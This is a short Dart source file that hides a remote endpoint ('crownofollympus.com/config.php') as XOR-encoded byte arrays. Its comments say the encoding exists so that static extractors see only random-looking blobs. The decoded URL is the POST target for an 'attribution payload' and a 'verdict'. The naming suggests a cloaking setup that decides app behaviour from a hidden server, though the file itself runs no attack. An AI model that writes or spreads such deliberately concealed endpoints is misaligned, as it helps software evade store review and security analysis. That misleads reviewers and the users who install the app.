import '../cipher/veil.dart';

// ---------------------------------------------------------------------------
// portal_wire — obfuscated verdict endpoint (POST target)
// ---------------------------------------------------------------------------
// The full URL is split into host and path halves and stored as XOR-encoded
// byte lists. Both halves live behind the same [_stream] as everything else
// in cipher/veil.dart, so a static extractor sees only random-looking blobs.
//
// Refresh the constants by running `dart run tool/forge_secrets.dart` and
// pasting the printed bytes in place.
// ---------------------------------------------------------------------------

// "https://crownofollympus.com"
const List<int> _verdictHost = <int>[
  0x9E, 0x8D, 0x68, 0x7A, 0x00, 0x3E, 0xD0, 0x39,
  0xF4, 0xA7, 0xC7, 0x22, 0xEB, 0xAD, 0x2D, 0x0C,
  0x82, 0x2F, 0x8D, 0xBA, 0x86, 0x8C, 0x6F, 0x24,
  0x10, 0x6B, 0x92,
];

// "/config.php"
const List<int> _verdictPath = <int>[
  0xD9, 0x9A, 0x73, 0x64, 0x15, 0x6D, 0x98, 0x38,
  0xE7, 0xBD, 0xD8,
];

/// Full verdict URL — POST target for the attribution payload.
String resolveVerdictUrl() {
  if (_verdictHost.isEmpty) return '';
  return unveil(_verdictHost) + unveil(_verdictPath);
}
